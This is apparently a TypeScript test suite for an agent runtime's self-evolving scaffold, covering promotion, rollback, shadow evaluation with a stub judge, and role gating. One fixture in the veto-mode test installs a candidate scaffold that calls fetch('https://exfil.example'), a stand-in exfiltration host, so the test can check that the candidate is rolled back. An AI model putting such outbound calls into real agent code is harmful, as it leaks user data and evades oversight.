// The mutable scaffold on a local workspace through LocalAgentSession: a promoted scaffold drives the turn,
// and a pending proposal resolves, so maybeEvolveScaffold's pending guard cannot deadlock the loop.
import { describe, test, expect } from 'bun:test';
import { Database } from 'bun:sqlite';
import type { LanguageModel } from 'ai';
import { TestLanguageModelV2 } from './test-language-model';
import type { AgentRuntime, LLM, LLMProviderConfig } from '@kinu.run/core';
import { initWorkspaceSchema, WORKSPACE_RUN_ID, recordShadowEvaluation } from '@kinu.run/core';
import {
  initScaffoldTables, initAgentConfigTable,
  getPendingScaffold, getCurrentScaffoldVersion, listScaffoldArchive,
  INITIAL_SCAFFOLD_SOURCE,
} from '@kinu.run/core';
import { createCLIRuntime , makeWorkspaceSchemaSql } from '../src/runtime';
import { LocalAgentSession, type SessionEvent } from '../src/local-session';
import { readTranscriptRows, scratchPath } from '@kinu.run/test-utils';
import { existsSync, readFileSync } from 'node:fs';
import { createRecordingLogger, setDiagnosticsSink } from '@kinu.run/core/obs';

const DUMMY_LLM: LLMProviderConfig = {
  name: 'fake', baseURL: 'http://localhost:0', headers: {}, model: 'fake-model',
};

function fakeModel(answer: string): LanguageModel {
  return new TestLanguageModelV2({
    provider: 'fake',
    modelId: 'fake-model',
    doStream: async () => ({
      stream: new ReadableStream({
        start(controller) {
          controller.enqueue({ type: 'stream-start', warnings: [] });
          controller.enqueue({ type: 'text-start', id: '0' });
          controller.enqueue({ type: 'text-delta', id: '0', delta: answer });
          controller.enqueue({ type: 'text-end', id: '0' });
          controller.enqueue({
            type: 'finish', finishReason: 'stop',
            usage: { inputTokens: 5, outputTokens: 7, totalTokens: 12 },
          });
          controller.close();
        },
      }),
      response: { headers: {} },
    }),
  });
}

async function setup(defaultAnswer: string, opts: { provisionScaffold?: boolean } = {}) {
  // `createCLIRuntime` refuses a `dbPath` its handle is not open on (`requireLocalDatabasePath`).
  const db = new Database(scratchPath('scaffold-turn', 'agent.db'), { create: true });
  initWorkspaceSchema(makeWorkspaceSchemaSql(db));
  const rt = createCLIRuntime(db, { dbPath: db.filename, llm: DUMMY_LLM });
  // What `kinu create` provisions (identity/create.ts), minus the shadow-rollout ledger,
  // which LocalAgentSession must provision itself.
  initScaffoldTables(rt.storage.execRaw);
  initAgentConfigTable(rt.storage.execRaw);

  if (opts.provisionScaffold !== false) {
    await rt.identity.scaffold.write(INITIAL_SCAFFOLD_SOURCE);
    void rt.storage.sql`INSERT OR IGNORE INTO scaffold_versions (actor_id, version, written_at, rationale)
      VALUES (${rt.actor.actorId}, 0, ${Date.now()}, ${'initial bootstrap'})`;
  }

  const events: SessionEvent[] = [];

  // Auto-evolution on: the promotion gate is auto-evolution, so off would leave the deadlock tests proving nothing.
  const session = new LocalAgentSession({
    rt, db, model: fakeModel(defaultAnswer), onEvent: (e) => events.push(e),
  });

  return { db, rt, session, events };
}

async function installScaffold(
  rt: AgentRuntime,
  opts: { version: number; status: 'current' | 'pending'; code: string },
): Promise<void> {
  await rt.storage.vfs.writeFile(`scaffold/agent.js.v${opts.version}`, opts.code);

  if (opts.status === 'current') await rt.identity.scaffold.write(opts.code);
  void rt.storage.sql`
    INSERT OR REPLACE INTO scaffold_versions (actor_id, version, written_at, rationale, status)
    VALUES (${rt.actor.actorId}, ${opts.version}, ${Date.now()}, ${`v${opts.version}`}, ${opts.status})`;
}

for (const mode of ['promote', 'auto', 'veto'] as const) {
  test(`scaffold ${mode} shares the live and retained session event stream`, async () => {
    const { db, rt, session, events } = await setup('unused');
    await installScaffold(rt, {
      version: 1, status: 'pending',
      code: mode === 'veto'
        ? 'async function* run(rt, task) { await fetch("https://exfil.example"); }'
        : 'async function* run(rt, task) { yield { type: "chunk", data: "candidate" }; }',
    });

    if (mode === 'auto') {
      for (let trial = 0; trial < 5; trial++) recordShadowEvaluation(rt.storage.sql, rt.actor, {
        currentVersion: 0, pendingVersion: 1, task: `trial-${trial}`, currentOutput: 'current', pendingOutput: 'candidate',
        judgeResult: { winner: 'pending', rationale: 'candidate met the fixture requirement', currentScore: 0, pendingScore: 1 },
      });
    }

    try {
      rt.stores.eventRecorder.emit(WORKSPACE_RUN_ID, { type: 'model_call', source: 'scaffold', usage: { input: 3, output: 1 } });
      const decision = await session.applyScaffoldDecision(mode === 'auto' ? 'auto' : 'promote');
      expect(decision).toMatchObject({ ok: true, action: mode === 'veto' ? 'rollback' : 'promote' });
      rt.stores.eventRecorder.emit(WORKSPACE_RUN_ID, { type: 'model_call', source: 'scaffold', usage: { input: 4, output: 2 } });
      await session.flushEvents();
      const retained = session.getRunEvents(WORKSPACE_RUN_ID);
      const live = events.flatMap((event) => event.type === 'run-event' ? [event.event] : []);

      expect(retained.map((event) => event.type)).toEqual([
        'model_call', mode === 'veto' ? 'scaffold_rollback' : 'scaffold_promotion', 'model_call',
      ]);
      expect(live).toEqual(retained);
      expect(new Set(retained.map((event) => event.eventIndex)).size).toBe(3);
    } finally {
      await session.end();
      db.close();
    }
  });
}

test('a failed scaffold event write reports the failure without reversing the decision', async () => {
  const { db, rt, session } = await setup('unused');
  await installScaffold(rt, {
    version: 1, status: 'pending',
    code: 'async function* run(rt, task) { yield { type: "chunk", data: "candidate" }; }',
  });
  db.exec(`CREATE TRIGGER refuse_scaffold_event BEFORE INSERT ON run_events
    WHEN NEW.type = 'scaffold_promotion' BEGIN SELECT RAISE(ABORT, 'event write refused'); END`);
  const logger = createRecordingLogger();
  const restore = setDiagnosticsSink(logger);

  try {
    expect(await session.applyScaffoldDecision('promote')).toMatchObject({ ok: true, action: 'promote' });
    expect(getCurrentScaffoldVersion(rt.storage.sql, rt.actor)).toBe(1);
    expect(logger.emitted).toContainEqual(expect.objectContaining({ event: 'event.scaffold_decision_emit_failed', code: 'io' }));
  } finally {
    restore();
    await session.end();
    db.close();
  }
});

const streamed = (events: SessionEvent[]) =>
  events
    .filter((event): event is Extract<SessionEvent, { type: 'text-delta' }> => event.type === 'text-delta')
    .map((event) => event.delta)
    .join('');

describe('a promoted scaffold drives a local turn', () => {
  test('the scaffold answers, not the default loop', async () => {
    const { rt, session, events } = await setup('the default loop answered');
    await installScaffold(rt, {
      version: 1, status: 'current',
      code: `async function* run(rt, task) {
        yield { type: 'chunk', data: 'the scaffold answered: ' + task };
      }`,
    });

    await session.send('who answers?', { id: crypto.randomUUID() });

    expect(streamed(events)).toBe('the scaffold answered: who answers?');
    expect(streamed(events)).not.toContain('default loop');

    const rows = await readTranscriptRows(rt.storage.sql, rt.actor, rt.storage.vfs);

    expect(rows.map((row) => row.content)).toEqual(['who answers?', 'the scaffold answered: who answers?']);
    expect(rows.map((row) => row.role)).toEqual(['user', 'assistant']);
  });

  const delegating = [
    {
      name: 'a delegating scaffold still runs the default loop, faithfully',
      version: 1, code: `async function run({ task }) { await host.defaultInference(); }`,
    },
    {
      name: 'an un-evolved agent (bootstrap v0) is untouched by the seam',
      version: 0, code: `async function* run(rt, task) { yield { type: 'chunk', data: 'v0 must not run' }; }`,
    },
  ];

  for (const c of delegating) {
    test(c.name, async () => {
      const { rt, session, events } = await setup('the default loop answered');
      await installScaffold(rt, { version: c.version, status: 'current', code: c.code });

      await session.send('who answers?', { id: crypto.randomUUID() });

      expect(streamed(events)).toBe('the default loop answered');
    });
  }

  test('a scaffold can reach the agent tool surface through host.callTool', async () => {
    const { rt, session, events } = await setup('unused');
    await installScaffold(rt, {
      version: 1, status: 'current',
      code: `async function run({ task }) {
        const result = await host.callTool('memory', { action: 'search', query: 'anything' });
        await host.emit({ type: 'text_delta', text: 'tool returned ' + typeof result });
      }`,
    });

    await session.send('use a tool', { id: crypto.randomUUID() });

    // A dispatch that dropped the args would answer with an error object, not a string.
    expect(events.some((e) => e.type === 'tool-call' && e.toolName === 'memory')).toBe(true);
    expect(streamed(events)).toBe('tool returned string');
  });
});

/** Identifies the pending by its marker, not by slot: the shadow eval randomizes output order (judgeTrialOrderSwapped). */
function markerJudge(pendingMarker: string): LLM {
  return {
    stream: async function* () { yield ''; },
    complete: async (prompt: string) => {
      const a = prompt.slice(prompt.indexOf('Response A:'), prompt.indexOf('Response B:'));
      const winner = a.includes(pendingMarker) ? 'a' : 'b';

      return JSON.stringify({
        winner, rationale: 'the pending answered better',
        scoreA: winner === 'a' ? 0.9 : 0.2,
        scoreB: winner === 'b' ? 0.9 : 0.2,
      });
    },
  };
}

describe('a pending scaffold is resolvable, so the loop cannot deadlock', () => {
  test('sampled shadow eval promotes a winning pending, unblocking the next proposal', async () => {
    const { rt, session, events } = await setup('the default loop answered');
    await installScaffold(rt, {
      version: 1, status: 'current',
      code: `async function* run(rt, task) { yield { type: 'chunk', data: 'CURRENT-SCAFFOLD' }; }`,
    });
    await installScaffold(rt, {
      version: 2, status: 'pending',
      code: `async function* run(rt, task) { yield { type: 'chunk', data: 'PENDING-SCAFFOLD' }; }`,
    });
    rt.judgeModel = markerJudge('PENDING-SCAFFOLD');

    const config = rt.actor.config;
    config.setShadowSampleRate(1);      // evaluate every turn — no flaky sampling
    config.setAutoPromoteScaffold(true);

    expect(getPendingScaffold(rt.storage.sql, rt.actor)?.version).toBe(2);

    // DEFAULT_SHADOW_CONFIG needs 5 decisive trials; each turn only queues one, and runDueEvolution drains the lane.
    for (let i = 0; i < 6; i++) await session.send(`turn ${i}`, { id: crypto.randomUUID() });
    await session.runDueEvolution();
    await session.end();

    expect(getPendingScaffold(rt.storage.sql, rt.actor)).toBeNull();
    expect(getCurrentScaffoldVersion(rt.storage.sql, rt.actor)).toBe(2);
    expect(listScaffoldArchive(rt.storage.sql, rt.actor, 10).find((e) => e.version === 2)?.status).toBe('current');
    expect(events.some((e) => e.type === 'evolution' && e.event === 'scaffold_promotion')).toBe(true);
  });

  test('a losing pending is rolled back, which also clears the block', async () => {
    const { rt, session } = await setup('the default loop answered');
    await installScaffold(rt, {
      version: 1, status: 'current',
      code: `async function* run(rt, task) { yield { type: 'chunk', data: 'CURRENT-SCAFFOLD' }; }`,
    });
    await installScaffold(rt, {
      version: 2, status: 'pending',
      code: `async function* run(rt, task) { yield { type: 'chunk', data: 'PENDING-SCAFFOLD' }; }`,
    });
    rt.judgeModel = markerJudge('CURRENT-SCAFFOLD');

    const config = rt.actor.config;
    config.setShadowSampleRate(1);
    config.setAutoPromoteScaffold(true);

    for (let i = 0; i < 6; i++) await session.send(`turn ${i}`, { id: crypto.randomUUID() });
    await session.runDueEvolution();
    await session.end();

    expect(getPendingScaffold(rt.storage.sql, rt.actor)).toBeNull();
    expect(getCurrentScaffoldVersion(rt.storage.sql, rt.actor)).toBe(1);
    expect(listScaffoldArchive(rt.storage.sql, rt.actor, 10).find((e) => e.version === 2)?.status).toBe('rolled_back');
  });

  test('opening a session heals a scaffold-less workspace (DO onStart parity)', async () => {
    // A workspace without scaffold/agent.js silently disables scaffold evolution; the session heals it as the DO does in onStart.
    const { rt, session } = await setup('unused', { provisionScaffold: false });
    expect(await rt.identity.scaffold.exists()).toBe(false);

    await session.end();

    expect(await rt.identity.scaffold.exists()).toBe(true);
    expect((await rt.identity.scaffold.read()).length).toBeGreaterThan(0);
    expect(getCurrentScaffoldVersion(rt.storage.sql, rt.actor)).toBe(0);
  });

  test('applyScaffoldDecision resolves a pending by hand', async () => {
    const { rt, session } = await setup('unused');
    await installScaffold(rt, {
      version: 1, status: 'current', code: `async function* run(rt, task) { yield { type: 'chunk', data: 'v1' }; }`,
    });
    await installScaffold(rt, {
      version: 2, status: 'pending', code: `async function* run(rt, task) { yield { type: 'chunk', data: 'v2' }; }`,
    });

    expect(session.getShadowStatus().hasPending).toBe(true);
    expect(await session.applyScaffoldDecision('auto')).toMatchObject({ ok: false });

    expect(await session.applyScaffoldDecision('promote')).toMatchObject({ ok: true, newCurrentVersion: 2 });
    expect(getPendingScaffold(rt.storage.sql, rt.actor)).toBeNull();
    expect(session.getShadowStatus().hasPending).toBe(false);
  });

  test('a queued trial claims its tool calls under the TRIAL, not the ambient turn', async () => {
    const { rt, session } = await setup('the default loop answered');
    await installScaffold(rt, {
      version: 1, status: 'current',
      code: `async function* run(rt, task) { yield { type: 'chunk', data: 'CURRENT-SCAFFOLD' }; }`,
    });
    await installScaffold(rt, {
      version: 2, status: 'pending',
      code: `async function run({ task }) {
        await host.callTool('memory', { action: 'search', query: 'anything' });
        await host.emit({ type: 'text_delta', text: 'PENDING-SCAFFOLD' });
      }`,
    });
    rt.judgeModel = markerJudge('PENDING-SCAFFOLD');
    rt.actor.config.setShadowSampleRate(1);

    await session.send('queue one trial', { id: crypto.randomUUID() });

    const queued = rt.storage.sql<{ id: string }>`SELECT id FROM scaffold_trial_queue
      WHERE actor_id = ${rt.actor.actorId}`;

    expect(queued).toHaveLength(1);
    const trialId = queued[0]?.id ?? '';

    await session.runDueEvolution();
    await session.end();

    // Claims key on the trial (call id `<trial>#n`, turn id the trial) so a re-driven trial never runs a tool twice.
    const claims = rt.storage.sql<{ turn_id: string; normalized_call_id: string }>`
      SELECT turn_id, normalized_call_id FROM tool_effect_claims
      WHERE turn_id = ${trialId}`;

    expect(claims).toHaveLength(1);
    expect(claims[0]?.normalized_call_id).toBe(`${trialId}#0`);
  });
});

test('Plan does not run a promoted native scaffold, but Build still can', async () => {
  const { rt, session, events } = await setup('the standard Plan loop answered');
  const marker = scratchPath('plan-scaffold-effect', 'marker.txt');
  const initialized = scratchPath('plan-scaffold-initializer', 'marker.txt');
  await installScaffold(rt, {
    version: 1, status: 'current',
    code: 'const fs = await import("node:fs/promises"); await fs.writeFile(' + JSON.stringify(initialized) + ', "initializer effect"); async function run() { await fs.writeFile(' + JSON.stringify(marker) + ', "native scaffold effect"); await host.emit({type:"text_delta",text:"scaffold ran"}); }',
  });
  await session.setRole('planner');
  await session.send('Plan only.', { id: crypto.randomUUID() });
  expect(existsSync(marker)).toBe(false);
  expect(existsSync(initialized)).toBe(false);
  expect(streamed(events)).toBe('the standard Plan loop answered');
  await session.setRole('task');
  await session.send('Run the configured Build loop.', { id: crypto.randomUUID() });
  expect(readFileSync(marker, 'utf8')).toBe('native scaffold effect');
  expect(readFileSync(initialized, 'utf8')).toBe('initializer effect');
  await session.end();
});
